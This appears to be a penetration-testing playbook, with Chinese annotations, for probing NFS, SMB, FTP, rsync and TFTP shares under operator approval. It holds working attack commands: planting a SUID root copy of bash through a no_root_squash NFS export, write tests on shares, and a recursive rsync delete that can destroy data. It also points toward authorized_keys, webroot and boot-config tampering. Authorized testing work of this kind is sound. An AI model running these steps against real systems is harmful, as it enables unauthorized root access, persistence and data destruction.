# File Services — NFS / SMB / FTP / rsync / TFTP

---

## NFS

### Gate

```bash
showmount -e TARGET
sudo mount -t nfs -o nolock TARGET:/EXPORT /mnt/nfs
stat -c '%u:%g %a %n' /mnt/nfs /mnt/nfs/* 2>/dev/null | head
```

高价值条件：

```text
rw export
no_root_squash
export maps to user home / webroot / executable path
UID/GID ownership relationship
```

### no_root_squash marker

只有确认 export 对应目标文件系统且操作员批准：

```bash
cp /bin/bash /mnt/nfs/tmp/sa-bash
chmod 4755 /mnt/nfs/tmp/sa-bash
```

成功条件：目标主机上该文件保留 root owner + SUID。完成后立即删除测试文件。

如果 operator 选择验证完整 host-access chain，可根据 export 与目标路径关系继续到 authorized_keys、startup/script/webroot 等真实执行路径；修改前保存原内容，完成后恢复。

---

## SMB

如果已有 share write：

```text
普通文件共享 → 数据/配置影响
Webroot/share → 可被应用消费的文件
Startup/GPO/script share → 环境特定执行链
```

先：

```bash
smbclient //TARGET/SHARE -U 'USER%PASS' -c 'put /tmp/marker.txt sa-marker.txt; ls sa-marker.txt; del sa-marker.txt'
```

成功 = write/delete primitive 确认。后续是否能形成执行取决于 share 的真实消费者，不能只因可写就宣称 RCE。

---

## FTP

```bash
ftp TARGET
```

有 write 权限时先上传 marker 并删除。只有确认 FTP root 与 Web root / scheduled import / executable deployment 路径关联时，才继续利用到执行结果。

---

## rsync

```bash
rsync --list-only rsync://TARGET/MODULE/
```

可写验证：

```bash
echo marker >/tmp/sa-marker
rsync /tmp/sa-marker rsync://TARGET/MODULE/sa-marker
rsync --list-only rsync://TARGET/MODULE/sa-marker
```

清理：

```bash
rsync --delete -r /tmp/empty/ rsync://TARGET/MODULE/path/   # 不要盲用；优先模块支持的精确删除方法
```

如果目标环境允许写入但删除能力未知，先记录 Impact=WRITE 并由操作者决定是否继续；不要把“清理困难”误判成攻击 primitive 不成立。

---

## TFTP

TFTP 没有认证，且常用于 PXE/设备配置。若操作者选择利用，可针对已确认的可写 filename/path 验证上传；覆盖 PXE/boot/config 属 HIGH/DESTRUCTIVE，必须说明会影响哪些客户端/设备并由操作者决定。
